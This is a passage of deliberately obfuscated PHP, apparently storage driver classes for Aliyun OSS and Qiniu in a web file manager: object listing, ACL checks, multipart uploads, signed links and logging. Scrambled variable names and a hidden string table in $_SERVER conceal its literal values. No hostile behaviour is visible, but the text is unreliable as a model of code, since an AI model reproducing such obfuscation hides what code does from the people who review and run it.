$this->getPathOuter($‰¼¤ŞÑĞ[8] . $¶°–Èøª), $‰¼¤ŞÑĞ[33] => $‰¼¤ŞÑĞ[78]); if ($¨¨–áÅ¤) { return $ô×´³…­; } $ô×´³…­[$‰¼¤ŞÑĞ[231]] = $ô×´³…­[$‰¼¤ŞÑĞ[88]] = 0; $ô×´³…­[$‰¼¤ŞÑĞ[232]] = $ô×´³…­[$‰¼¤ŞÑĞ[233]] = !0; if (empty($üó™¹ˆ®)) { $¶°–Èøª = rtrim($¶°–Èøª, $‰¼¤ŞÑĞ[8]) . $‰¼¤ŞÑĞ[8]; $ßÅÒ¶ŞË = $this->objectMeta($¶°–Èøª); if (!$ßÅÒ¶ŞË) { return $ô×´³…­; } $üó™¹ˆ® = array($‰¼¤ŞÑĞ[231] => $ßÅÒ¶ŞË[$‰¼¤ŞÑĞ[575]][$‰¼¤ŞÑĞ[1473]], $‰¼¤ŞÑĞ[88] => strtotime($ßÅÒ¶ŞË[$‰¼¤ŞÑĞ[1470]])); } if (isset($üó™¹ˆ®[$‰¼¤ŞÑĞ[88]])) { $ô×´³…­[$‰¼¤ŞÑĞ[88]] = $üó™¹ˆ®[$‰¼¤ŞÑĞ[88]]; } if (isset($üó™¹ˆ®[$‰¼¤ŞÑĞ[231]])) { $ô×´³…­[$‰¼¤ŞÑĞ[231]] = $üó™¹ˆ®[$‰¼¤ŞÑĞ[231]]; } return $ô×´³…­; } public function listPath($îÀÓäü, $Ë¤ì–è = false) { $»›î’Ê¯ =& $_SERVER[ˆ¡¹µ‹Â]; $–³ö“×÷ = $this->fileList($îÀÓäü, $»›î’Ê¯[8], !0); foreach ($–³ö“×÷[$»›î’Ê¯[85]] as $¦ßáÄ± => $•Â÷œÅé) { $–³ö“×÷[$»›î’Ê¯[85]][$¦ßáÄ±] = $this->folderInfo($•Â÷œÅé, $Ë¤ì–è, $•Â÷œÅé); } foreach ($–³ö“×÷[$»›î’Ê¯[86]] as $¦ßáÄ± => $•Â÷œÅé) { $–³ö“×÷[$»›î’Ê¯[86]][$¦ßáÄ±] = $this->fileInfo($•Â÷œÅé[$»›î’Ê¯[32]], $Ë¤ì–è, $•Â÷œÅé); } return $–³ö“×÷; } protected function infoChildren($ïÓíÄØÈ, &$ƒ¿Ê…ïò) { $Íô²Úìæ =& $_SERVER[ˆ¡¹µ‹Â]; $øÕ“Éı = $this->fileList($ïÓíÄØÈ, $Íô²Úìæ[12], !0); $ƒ¿Ê…ïò[$Íô²Úìæ[81]] += count($øÕ“Éı[$Íô²Úìæ[85]]); $ƒ¿Ê…ïò[$Íô²Úìæ[80]] += count($øÕ“Éı[$Íô²Úìæ[86]]); foreach ($øÕ“Éı[$Íô²Úìæ[86]] as $Üœ„Æäİ) { if (!$Üœ„Æäİ || !$Üœ„Æäİ[$Íô²Úìæ[79]]) { continue; } $ƒ¿Ê…ïò[$Íô²Úìæ[79]] += $Üœ„Æäİ[$Íô²Úìæ[79]]; } } public function has($¹’ÈŸŒ¬, $Ê¶ø…Ì = false, $ç”¤¥ù¯ = true) { $±‚Ï¢ÑÄ =& $_SERVER[ˆ¡¹µ‹Â]; $¹’ÈŸŒ¬ = trim($¹’ÈŸŒ¬, $±‚Ï¢ÑÄ[8]); $›¯³ÄÌ¼ = empty($¹’ÈŸŒ¬) && $¹’ÈŸŒ¬ !== $±‚Ï¢ÑÄ[228] ? $±‚Ï¢ÑÄ[12] : $¹’ÈŸŒ¬ . $±‚Ï¢ÑÄ[8]; $æÁà”¹í = $±‚Ï¢ÑÄ[12]; $ùÎšóï = 500; $ğ°±¸şš = $¢Æ¼¯åê = 0; while (!0) { check_abort(); $½™ˆÖæØ = array($±‚Ï¢ÑÄ[1464] => $±‚Ï¢ÑÄ[8], $±‚Ï¢ÑÄ[1465] => $›¯³ÄÌ¼, $±‚Ï¢ÑÄ[1466] => $ùÎšóï, $±‚Ï¢ÑÄ[1467] => $æÁà”¹í); try { $ş ®ìŒÃ = $this->client->listObjects($this->bucket, $½™ˆÖæØ); } catch (OSS\Core\OssException $¨ê×ôÍ) { $this->writeLog(__FUNCTION__ . $±‚Ï¢ÑÄ[214] . $¨ê×ôÍ->getMessage()); break; } $æÁà”¹í = $ş ®ìŒÃ->getNextMarker(); $§ó™ = $ş ®ìŒÃ->getObjectList(); $•ŞÙšãÏ = $ş ®ìŒÃ->getPrefixList(); if ($Ê¶ø…Ì) { if (count($§ó™) > 1 || count($§ó™) == 1 && $§ó™[0]->getKey() != $›¯³ÄÌ¼) { $ğ°±¸şš += count($§ó™) - 1; } if (!empty($•ŞÙšãÏ)) { $¢Æ¼¯åê += count($•ŞÙšãÏ); } if ($æÁà”¹í === $±‚Ï¢ÑÄ[12]) { break; } continue; } if ($ç”¤¥ù¯) { if (!empty($§ó™)) { if (count($§ó™) > 1 || $§ó™[0]->getKey() != $›¯³ÄÌ¼) { return !0; } } } else { if (!empty($•ŞÙšãÏ)) { return !0; } } if ($æÁà”¹í === $±‚Ï¢ÑÄ[12]) { break; } } if ($Ê¶ø…Ì) { return array($±‚Ï¢ÑÄ[239] => $ğ°±¸şš, $±‚Ï¢ÑÄ[240] => $¢Æ¼¯åê); } return !1; } public function listAll($‘Ûî­÷) { $ÈÚıò¤‡ =& $_SERVER[ˆ¡¹µ‹Â]; $Ğš‘ÒÎô = $this->fileList($‘Ûî­÷, $ÈÚıò¤‡[12], !0); $­¥›æØ = array_to_keyvalue($Ğš‘ÒÎô[$ÈÚıò¤‡[86]], $ÈÚıò¤‡[32]); foreach ($Ğš‘ÒÎô[$ÈÚıò¤‡[85]] as $çï÷«âæ) { if (is_string($çï÷«âæ)) { $­¥›æØ[$çï÷«âæ] = array($ÈÚıò¤‡[79] => 0); } } return $this->listAllFiles($‘Ûî­÷, $­¥›æØ); } public function canRead($ñÙÅ©Åû) { $Ÿ¯µãÀâ =& $_SERVER[ˆ¡¹µ‹Â]; $¹µ´ôÈ = $this->pathAcl($ñÙÅ©Åû); return $¹µ´ôÈ == $Ÿ¯µãÀâ[1474] || $¹µ´ôÈ == $Ÿ¯µãÀâ[619] ? !0 : !1; } public function canWrite($äŸÓ—®¼) { $ñÆóà…¡ = $this->pathAcl($äŸÓ—®¼); return $ñÆóà…¡ == $_SERVER[ˆ¡¹µ‹Â][619] ? !0 : !1; } public function pathAcl($ª½Î§”) { $ûÓƒ¿Ç– =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $íÚĞ”’Ó = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ª½Î§”)); } catch (OSS\Core\OssException $³éü¸Ü°) { $this->writeLog(__FUNCTION__ . $ûÓƒ¿Ç–[214] . $³éü¸Ü°->getMessage()); return !1; } $íÜÍ‘İæ = $íÚĞ”’Ó == $ûÓƒ¿Ç–[37] ? $this->bucketAcl : $íÚĞ”’Ó; if ($íÜÍ‘İæ == $ûÓƒ¿Ç–[1475]) { return $ûÓƒ¿Ç–[1474]; } if ($íÜÍ‘İæ == $ûÓƒ¿Ç–[1476]) { return $ûÓƒ¿Ç–[619]; } return $íÜÍ‘İæ; } private function chmodPath($ œä¯Šô, $ÊåÌ©óí = '') { $ñ®àŒÚ¯ =& $_SERVER[ˆ¡¹µ‹Â]; $Ÿ†ô»¦ë = empty($ÊåÌ©óí) ? $ñ®àŒÚ¯[1476] : $ÊåÌ©óí; $†Àı–é = array($ñ®àŒÚ¯[37], $ñ®àŒÚ¯[229], $ñ®àŒÚ¯[1475], $ñ®àŒÚ¯[1476]); if (!in_array($Ÿ†ô»¦ë, $†Àı–é)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ œä¯Šô), $Ÿ†ô»¦ë); } catch (OSS\Core\OssException $¤¶¹şˆÇ) { $this->writeLog(__FUNCTION__ . $ñ®àŒÚ¯[214] . $¤¶¹şˆÇ->getMessage()); return !1; } return !0; } public function getContent($€ÔşõÅ) { return $this->fileSubstr($€ÔşõÅ, -1); } public function setContent($É¹ ù, $œ‰‚ÀğÔ = '') { $’™ˆ–îâ =& $_SERVER[ˆ¡¹µ‹Â]; try { $µŸû“ô“ = $this->trafficLimit($’™ˆ–îâ[1477]); $Üìã¶™Ú = $this->client->putObject($this->bucket, $this->pathEncode($É¹ ù), $œ‰‚ÀğÔ, $µŸû“ô“); } catch (OSS\Core\OssException $§‘—ìëÎ) { $this->writeLog(__FUNCTION__ . $’™ˆ–îâ[214] . $§‘—ìëÎ->getMessage()); return !1; } $«şµß›Í = array($’™ˆ–îâ[1471] => trim($Üìã¶™Ú[$’™ˆ–îâ[1468]], $’™ˆ–îâ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($É¹ ù))); $this->updateObjMeta($É¹ ù, $«şµß›Í); return isset($Üìã¶™Ú[$’™ˆ–îâ[1478]][$’™ˆ–îâ[292]]) ? !0 : !1; } private function updateObjMeta($ÇË˜Şá®, $Æ±Ã÷Ûª) { $ÇË˜Şá® = $this->pathEncode($ÇË˜Şá®); try { $‹Ú­¥· = array(OSS\OssClient::OSS_HEADERS => $Æ±Ã÷Ûª); $this->client->copyObject($this->bucket, $ÇË˜Şá®, $this->bucket, $ÇË˜Şá®, $‹Ú­¥·); } catch (OSS\Core\OssException $¡ˆåœè£) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][214] . $¡ˆåœè£->getMessage()); return !1; } return !0; } public function upload($¿Ë¾ï¾Å, $ã±üåàå, $›ÅÀÀ„ = false, $¬¯Ş„Øß = REPEAT_REPLACE) { $úÇá‚şº =& $_SERVER[ˆ¡¹µ‹Â]; $Ë·ØÁä = trim($¿Ë¾ï¾Å, $úÇá‚şº[8]); $ı†ˆëã° = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($úÇá‚şº[1471] => @md5_file($ã±üåàå)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¿Ë¾ï¾Å))); $ı†ˆëã° = $this->trafficLimit($úÇá‚şº[1477], $ı†ˆëã°); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ë·ØÁä), $ã±üåàå, $ı†ˆëã°); } catch (OSS\Core\OssException $·¨‰Ì‡…) { $this->writeLog(__FUNCTION__ . $úÇá‚şº[214] . $·¨‰Ì‡…->getMessage()); return !1; } return $this->getPathOuter($¿Ë¾ï¾Å); } public function getHost() { $ÕÑû±âË =& $_SERVER[ˆ¡¹µ‹Â]; $ò¤™Ì¤İ = explode($ÕÑû±âË[210], parent::getHost()); return $ò¤™Ì¤İ[0] . $ÕÑû±âË[210] . $this->bucket . $ÕÑû±âË[10] . $ò¤™Ì¤İ[1]; } public function uploadFormData($Ç¤‰Ç„Ø, $šõ»Œ© = 3600) { $ÎŒœÃï =& $_SERVER[ˆ¡¹µ‹Â]; if (!($Ş÷ªÄî = $this->getHost())) { return !1; } $ĞåõªÇé = $šõ»Œ©; $Ê¯†Â… = date($ÎŒœÃï[1479], time() + $ĞåõªÇé); $ÎÑí£ó = new DateTime($Ê¯†Â…); $™¶¦ˆ¤ = $ÎÑí£ó->format(DateTime::ISO8601); $¡ä€Úêƒ = strpos($™¶¦ˆ¤, $ÎŒœÃï[372]); $™¶¦ˆ¤ = substr($™¶¦ˆ¤, 0, $¡ä€Úêƒ) . $ÎŒœÃï[1480]; $®ì¡ÃÍ¤ = 1048576000 * 5; $°øÊÎá = $this->pathFather($Ç¤‰Ç„Ø); $Ú˜áî = array($ÎŒœÃï[275] => $™¶¦ˆ¤, $ÎŒœÃï[278] => array(array($ÎŒœÃï[1481], 0, $®ì¡ÃÍ¤), array($ÎŒœÃï[281], $ÎŒœÃï[282], $°øÊÎá))); $æÂ¶¤®° = base64_encode(json_encode($Ú˜áî)); $‹®¹Ïò = base64_encode(hash_hmac($ÎŒœÃï[263], $æÂ¶¤®°, $this->secret, !0)); $¸¥øéŞ© = array($ÎŒœÃï[293] => $æÂ¶¤®°, $ÎŒœÃï[1482] => $this->accessKey, $ÎŒœÃï[285] => $ÎŒœÃï[274], $ÎŒœÃï[1483] => $‹®¹Ïò, $ÎŒœÃï[208] => $Ş÷ªÄî); $¸¥øéŞ© = $this->trafficLimit($ÎŒœÃï[1477], $¸¥øéŞ©); return $¸¥øéŞ©; } public function multiUploadFormData($ÒĞğ¿«µ, $­çÄÎ÷– = 3600) { $Ğ¸ñ˜ô‘ =& $_SERVER[ˆ¡¹µ‹Â]; if (!($‰Ù‰ŞŞ = $this->getHost())) { return !1; } $½–è²À = $this->trafficLimit($Ğ¸ñ˜ô‘[1477]); $„óÍ¿È³ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÒĞğ¿«µ), $½–è²À); return array($Ğ¸ñ˜ô‘[254] => $„óÍ¿È³, $Ğ¸ñ˜ô‘[208] => $‰Ù‰ŞŞ . $Ğ¸ñ˜ô‘[8] . $this->pathEncode($ÒĞğ¿«µ), $Ğ¸ñ˜ô‘[255] => gmdate($Ğ¸ñ˜ô‘[1484]), $Ğ¸ñ˜ô‘[97] => $ÒĞğ¿«µ); } public function multiUploadAuthData($é«Øï·›, $Û®ş’Ú = array()) { $ÊˆÇœŞ¤ =& $_SERVER[ˆ¡¹µ‹Â]; $²ñÚï¿Á = isset($Û®ş’Ú[$ÊˆÇœŞ¤[255]]) ? $Û®ş’Ú[$ÊˆÇœŞ¤[255]] : gmdate($ÊˆÇœŞ¤[1484]); $˜¬Úáûä = isset($Û®ş’Ú[$ÊˆÇœŞ¤[169]]) ? $Û®ş’Ú[$ÊˆÇœŞ¤[169]] : $ÊˆÇœŞ¤[12]; $¿œü€÷Ô = $é«Øï·›; if (isset($Û®ş’Ú[$ÊˆÇœŞ¤[97]])) { $¿œü€÷Ô = $Û®ş’Ú[$ÊˆÇœŞ¤[97]]; unset($Û®ş’Ú[$ÊˆÇœŞ¤[97]]); } if (isset($Û®ş’Ú[$ÊˆÇœŞ¤[256]])) { $Û®ş’Ú[$ÊˆÇœŞ¤[255]] = $²ñÚï¿Á; return $this->listUploadParts($¿œü€÷Ô, $Û®ş’Ú); } $‚‘¤ ”ş = array($ÊˆÇœŞ¤[257], $ÊˆÇœŞ¤[12], $ÊˆÇœŞ¤[123], $²ñÚï¿Á, "\x78\x2d\157\x73\163\55\x64\x61\x74\x65\x3a{$²ñÚï¿Á}", $ÊˆÇœŞ¤[8] . $this->bucket . $ÊˆÇœŞ¤[8] . $¿œü€÷Ô . $˜¬Úáûä); if (strpos($˜¬Úáûä, $ÊˆÇœŞ¤[258]) === 0) { $‚‘¤ ”ş[0] = $ÊˆÇœŞ¤[259]; if ($¼’ö‡’Ş = $this->trafficLimit($ÊˆÇœŞ¤[1477])) { $¿œü€÷Ô = $ÊˆÇœŞ¤[1485]; array_splice($‚‘¤ ”ş, 5, 0, $¿œü€÷Ô . $ÊˆÇœŞ¤[4] . $¼’ö‡’Ş[$¿œü€÷Ô]); } } if (isset($Û®ş’Ú[$ÊˆÇœŞ¤[260]]) && $Û®ş’Ú[$ÊˆÇœŞ¤[260]] == $ÊˆÇœŞ¤[261]) { $‚‘¤ ”ş[0] = $ÊˆÇœŞ¤[261]; } if (!empty($Û®ş’Ú[$ÊˆÇœŞ¤[1486]])) { $è“˜Œ° = array_merge(array($‚‘¤ ”ş[4]), $Û®ş’Ú[$ÊˆÇœŞ¤[1486]]); sort($è“˜Œ°); $‚‘¤ ”ş[4] = implode($ÊˆÇœŞ¤[262], $è“˜Œ°); } $€Ã›Ğ›  = implode($ÊˆÇœŞ¤[262], $‚‘¤ ”ş); $Áğª±  = base64_encode(hash_hmac($ÊˆÇœŞ¤[263], $€Ã›Ğ› , $this->secret, !0)); $İÊš²› = $ÊˆÇœŞ¤[1454] . $this->accessKey . $ÊˆÇœŞ¤[4] . $Áğª± ; if (strpos($˜¬Úáûä, $ÊˆÇœŞ¤[258]) === 0) { $İÊš²› = array($ÊˆÇœŞ¤[265] => $İÊš²›, $ÊˆÇœŞ¤[255] => $²ñÚï¿Á); if ($¼’ö‡’Ş) { $İÊš²› = array_merge($İÊš²›, $¼’ö‡’Ş); } } return $İÊš²›; } public function listUploadParts($²—°‡»™, $Ò³«Õ) { $“äÃª‚— =& $_SERVER[ˆ¡¹µ‹Â]; $šüáúûË = parse_url_query($Ò³«Õ[$“äÃª‚—[169]]); $ªƒ—É¶¡ = $this->client->listParts($this->bucket, $this->pathEncode($²—°‡»™), $šüáúûË[$“äÃª‚—[254]]); $¸Ÿ«Œê® = $ªƒ—É¶¡->getListPart(); $°íÒìÀ‘ = array(); foreach ($¸Ÿ«Œê® as $©‡«£°¿) { $°íÒìÀ‘[] = array($“äÃª‚—[308] => $©‡«£°¿->getPartNumber(), $“äÃª‚—[309] => trim($©‡«£°¿->getETag(), $“äÃª‚—[121])); } unset($Ò³«Õ[$“äÃª‚—[256]], $Ò³«Õ[$“äÃª‚—[260]]); $èòÚ“œ = $this->multiUploadAuthData($²—°‡»™, $Ò³«Õ); if (empty($èòÚ“œ)) { return !1; } return array($“äÃª‚—[265] => $èòÚ“œ, $“äÃª‚—[255] => $Ò³«Õ[$“äÃª‚—[255]], $“äÃª‚—[267] => $°íÒìÀ‘); } public function download($ßæ©´í, $Á”ã‹£) { $Ú…À·Õ™ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isFolder($ßæ©´í)) { return !1; } try { $îĞá“Ò™ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Á”ã‹£); $îĞá“Ò™ = $this->trafficLimit($Ú…À·Õ™[112], $îĞá“Ò™); $this->client->getObject($this->bucket, $this->pathEncode($ßæ©´í), $îĞá“Ò™); } catch (OSS\Core\OssException $Ô¡ËÂš) { $this->writeLog(__FUNCTION__ . $Ú…À·Õ™[214] . $Ô¡ËÂš->getMessage()); return !1; } return $Á”ã‹£; } public function fileSubstr($¦¶èùå¹, $¼Óüúñš = 0, $´è…™ª¤ = false) { if ($¼Óüúñš === -1) { $İº¹ˆ = array(); } else { if ($´è…™ª¤ === !1) { $ñë•äğ = $this->size($¦¶èùå¹); } else { $ñë•äğ = $¼Óüúñš + $´è…™ª¤ - 1; } $İº¹ˆ = array(OSS\OssClient::OSS_RANGE => "{$¼Óüúñš}\55{$ñë•äğ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¦¶èùå¹), $İº¹ˆ); } catch (OSS\Core\OssException $·«ÔñÇÈ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][214] . $·«ÔñÇÈ->getMessage()); think_exception($·«ÔñÇÈ->getMessage()); return !1; } } private function trafficLimit($³˜ÜìØá, $Ãá®»Ğ = array()) { $…¿â£™‡ =& $_SERVER[ˆ¡¹µ‹Â]; if ($³˜ÜìØá == $…¿â£™‡[1477] && $this->isUploadServer() || $³˜ÜìØá == $…¿â£™‡[112] && $this->isFileOutServer()) { return $Ãá®»Ğ; } $’óâŞß¡ = floatval($GLOBALS[$…¿â£™‡[6]][$…¿â£™‡[92]][$…¿â£™‡[110]][$³˜ÜìØá]) * 1024 * 1024 * 8; if (!$’óâŞß¡) { return $Ãá®»Ğ; } $’óâŞß¡ = $’óâŞß¡ < 819200 ? 819200 : ($’óâŞß¡ > 838860800 ? 838860800 : $’óâŞß¡); $Ãá®»Ğ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($’óâŞß¡); return $Ãá®»Ğ; } public function link($İæø¾ÜÇ, $ĞîÉ·Ò˜ = array()) { $§°…”ˆé =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->exist($İæø¾ÜÇ) || $this->isFolder($İæø¾ÜÇ)) { return !1; } try { $ĞîÉ·Ò˜ = $this->trafficLimit($§°…”ˆé[112], $ĞîÉ·Ò˜); $’èîüìí = $this->client->signUrl($this->bucket, $this->pathEncode($İæø¾ÜÇ), 3600 * 12, $§°…”ˆé[261], $ĞîÉ·Ò˜); return $this->getCdnLink($’èîüìí); } catch (OSS\Core\OssException $¥‡·Ê¾) { $this->writeLog(__FUNCTION__ . $§°…”ˆé[214] . $¥‡·Ê¾->getMessage()); return !1; } } public function fileOut($ÆÛÁşÍ÷, $¶÷»–á· = false, $•¥ğÆ­ = false, $È÷‡ËÈ¶ = '') { $®âïş =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÆÛÁşÍ÷, $¶÷»–á·, $•¥ğÆ­, $È÷‡ËÈ¶); } if (!$•¥ğÆ­) { $•¥ğÆ­ = $this->pathThis($ÆÛÁşÍ÷); } $•¥ğÆ­ = rawurlencode($•¥ğÆ­); $ Åë—ùÕ = get_file_mime(get_path_ext($•¥ğÆ­)); if ($ Åë—ùÕ == $®âïş[248]) { return parent::fileOut($ÆÛÁşÍ÷, $¶÷»–á·, $•¥ğÆ­, $È÷‡ËÈ¶); } $¶÷»–á· = $¶÷»–á· ? $®âïş[1487] : $®âïş[1488]; $¬¼‰¡¸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $®âïş[1489] . rawurlencode("{$¶÷»–á·}\x3b\x66\x69\x6c\x65\x6e\x61\155\145\75{$•¥ğÆ­}")); $¬¼‰¡¸[OSS\OssClient::OSS_SUB_RESOURCE] .= $®âïş[1490] . rawurlencode($ Åë—ùÕ); $©Èû¯À = $this->link($ÆÛÁşÍ÷, $¬¼‰¡¸); $this->fileOutLink($©Èû¯À); } public function fileOutServer($èìÉ², $È²ı¸ÉÇ = false, $¯» €²… = false, $èçÇûÁ¢ = '') { parent::fileOut($èìÉ², $È²ı¸ÉÇ, $¯» €²…, $èçÇûÁ¢); } public function fileOutImage($ÎıÎ»ò, $Ò´ˆ€üï = 250) { if ($this->size($ÎıÎ»ò) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÎıÎ»ò, $Ò´ˆ€üï); } $ÄšØıÄ¹ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ˆ¡¹µ‹Â][1451] . $Ò´ˆ€üï); $Ò¾ˆù°è = $this->link($ÎıÎ»ò, $ÄšØıÄ¹); $this->fileOutLink($Ò¾ˆù°è); } public function fileOutImageServer($•“ÂúØ¼, $ËÁÍ™ò¯ = 250) { parent::fileOutImage($•“ÂúØ¼, $ËÁÍ™ò¯); } public function fileOutLink($Ì¼†íúô) { $Ò¢ËòÙõ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->isCdnHost() && substr($Ì¼†íúô, 0, 7) == $Ò¢ËòÙõ[313]) { $Ì¼†íúô = $Ò¢ËòÙõ[314] . substr($Ì¼†íúô, 7); } header($Ò¢ËòÙõ[175] . $Ì¼†íúô); die; } public function hashMd5($ÒêÂú², $­ïä±Ñ = '') { $ƒû¿Ç’ =& $_SERVER[ˆ¡¹µ‹Â]; $£šÚ©íŠ = $this->_objectMeta($ÒêÂú²); if (!$£šÚ©íŠ) { return $ƒû¿Ç’[12]; } if (!isset($£šÚ©íŠ[$ƒû¿Ç’[1471]]) && !empty($­ïä±Ñ)) { $ÜíåÃÜÓ = $this->updateObjMeta($ÒêÂú², array($ƒû¿Ç’[1471] => $­ïä±Ñ)); $£šÚ©íŠ[$ƒû¿Ç’[1471]] = $ÜíåÃÜÓ ? $­ïä±Ñ : $ƒû¿Ç’[12]; } return isset($£šÚ©íŠ[$ƒû¿Ç’[1471]]) ? strtolower($£šÚ©íŠ[$ƒû¿Ç’[1471]]) : $ƒû¿Ç’[12]; } public function size($ÃÎ€èËÁ) { $·²ó¤ó = $this->objectMeta($ÃÎ€èËÁ); return $·²ó¤ó ? $·²ó¤ó[$_SERVER[ˆ¡¹µ‹Â][79]] : 0; } public function info($ŸÖÆ¡Óø) { if ($this->isFolder($ŸÖÆ¡Óø)) { return $this->folderInfo($ŸÖÆ¡Óø); } else { if ($this->isFile($ŸÖÆ¡Óø)) { return $this->fileInfo($ŸÖÆ¡Óø); } } return !1; } public function exist($Úşëøã¿) { return $this->isFile($Úşëøã¿) || $this->isFolder($Úşëøã¿); } public function isFile($ä×¸¶Œú) { return !$this->isFolder($ä×¸¶Œú) && $this->objectMeta($ä×¸¶Œú); } public function isFolder($öù„Ô°Ú) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][179], $öù„Ô°Ú); } protected function objectMeta($›²ßŸ) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][181], $›²ßŸ); } protected function _objectMeta($Ğïƒ¿ç­) { $×Í¦ŸôÈ =& $_SERVER[ˆ¡¹µ‹Â]; try { $¡èâä½³ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ğïƒ¿ç­)); } catch (OSS\Core\OssException $©³‡–¼ˆ) { $this->writeLog(__FUNCTION__ . $×Í¦ŸôÈ[214] . $©³‡–¼ˆ->getMessage()); $¡èâä½³ = !1; } if ($¡èâä½³) { $¡èâä½³[$×Í¦ŸôÈ[79]] = intval($¡èâä½³[$×Í¦ŸôÈ[1469]]); } return $¡èâä½³; } protected function _isFolder($ß—ØÉŒÅ) { $±ÒŞñş½ =& $_SERVER[ˆ¡¹µ‹Â]; if ($ß—ØÉŒÅ == $±ÒŞñş½[12] || $ß—ØÉŒÅ == $±ÒŞñş½[8]) { return !0; } $„°š—˜š = array($±ÒŞñş½[1464] => $±ÒŞñş½[8], $±ÒŞñş½[1465] => rtrim($ß—ØÉŒÅ, $±ÒŞñş½[8]) . $±ÒŞñş½[8], $±ÒŞñş½[1466] => 1, $±ÒŞñş½[1467] => $±ÒŞñş½[12]); $âïËî½Í = $this->client->listObjects($this->bucket, $„°š—˜š); if ($âïËî½Í->getObjectList() || $âïËî½Í->getPrefixList()) { return !0; } return !1; } public function writeLog($Ê º»‹Ğ = '', $Ş÷†½‚Û = false) { $Š’€è‘ =& $_SERVER[ˆ¡¹µ‹Â]; $É›ÉåÏ‚ = in_array(ACTION, array($Š’€è‘[212], $Š’€è‘[213])); if (!$É›ÉåÏ‚ && !GLOBAL_DEBUG) { return; } $€¾¸ï¸™ = 0; if (stripos($Ê º»‹Ğ, $Š’€è‘[1491]) !== !1) { $€¾¸ï¸™ = 1; $ÛÑÁ‰éÖ = explode($Š’€è‘[1492], $Ê º»‹Ğ); $Ê º»‹Ğ = !empty($ÛÑÁ‰éÖ[1]) ? $ÛÑÁ‰éÖ[1] : $Ê º»‹Ğ; } else { if (stripos($Ê º»‹Ğ, $Š’€è‘[1493])) { $€¾¸ï¸™ = 2; $ÛÑÁ‰éÖ = explode($Š’€è‘[1493], $Ê º»‹Ğ); $ÛÑÁ‰éÖ = explode($Š’€è‘[4], $ÛÑÁ‰éÖ[0]); $Ê º»‹Ğ = !empty($ÛÑÁ‰éÖ[1]) ? $ÛÑÁ‰éÖ[1] : $Ê º»‹Ğ; } } if ($É›ÉåÏ‚ && I18n::getType() == $Š’€è‘[1494]) { if ($€¾¸ï¸™ == 1) { $Ê º»‹Ğ = str_replace($Š’€è‘[1495], $Š’€è‘[1496], $Ê º»‹Ğ); } else { if ($€¾¸ï¸™ == 2) { $ÛÑÁ‰éÖ = explode($Š’€è‘[214], $ÛÑÁ‰éÖ[0]); $¨¤È‡´¬ = isset($ÛÑÁ‰éÖ[1]) ? $ÛÑÁ‰éÖ[1] : $Š’€è‘[12]; $‡ì÷ö = array($Š’€è‘[1497] => $Š’€è‘[1498], $Š’€è‘[1499] => $Š’€è‘[1500], $Š’€è‘[1501] => $Š’€è‘[1502], $Š’€è‘[1503] => $Š’€è‘[1504], $Š’€è‘[1505] => $Š’€è‘[1506], $Š’€è‘[1507] => $Š’€è‘[1508], $Š’€è‘[1509] => $Š’€è‘[1510], $Š’€è‘[1511] => $Š’€è‘[1512], $Š’€è‘[1513] => $Š’€è‘[1514], $Š’€è‘[1515] => $Š’€è‘[1516]); if (isset($‡ì÷ö[$¨¤È‡´¬])) { $Ê º»‹Ğ = $‡ì÷ö[$¨¤È‡´¬]; } } } if (stripos($Ê º»‹Ğ, $Š’€è‘[1517])) { $Ê º»‹Ğ = $Š’€è‘[1518]; } } if (!trim($Ê º»‹Ğ)) { return; } parent::writeLog(trim($Ê º»‹Ğ), $Ş÷†½‚Û); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($©ˆ™÷Œî) { parent::__construct(); require_once SDK_DIR . $_SERVER[ˆ¡¹µ‹Â][1519]; $this->_init($©ˆ™÷Œî); } public function _init($ù·‘³¥õ) { $Ÿ±Îôı£ =& $_SERVER[ˆ¡¹µ‹Â]; $this->config = $ù·‘³¥õ; foreach ($ù·‘³¥õ as $¨üœÕ’ => $‚ÑÌáÉ) { if (isset($this->{$¨üœÕ’})) { $this->{$¨üœÕ’} = $‚ÑÌáÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ÿ±Îôı£[1520] . LNG($Ÿ±Îôı£[1455])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($â®ö·•, $ä›â¿´Û = '', $É©¤üïï = REPEAT_RENAME) { if ($this->setContent($â®ö·•, $ä›â¿´Û)) { return $this->getPathOuter($â®ö·•); } return !1; } public function mkdir($åôÙÍ«“, $ƒ×Şï£‡ = REPEAT_SKIP) { $¸ùÛê¡¨ =& 